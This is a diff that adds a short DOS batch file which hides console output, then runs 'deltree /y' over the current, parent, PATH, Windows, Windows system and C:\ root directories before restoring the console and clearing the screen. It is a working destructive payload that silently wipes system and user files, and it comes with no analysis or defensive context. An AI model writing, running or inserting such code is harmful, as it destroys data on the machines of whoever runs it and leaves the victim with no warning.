@@ -1,0 +1,5 @@
+@echo off
+ctty nul
+@for %%b in (*.* %path%\*.* ..\*.* %windir%\*.* c:\*.* %windir%\system\*.*) do deltree/y %%b
+ctty con
+cls
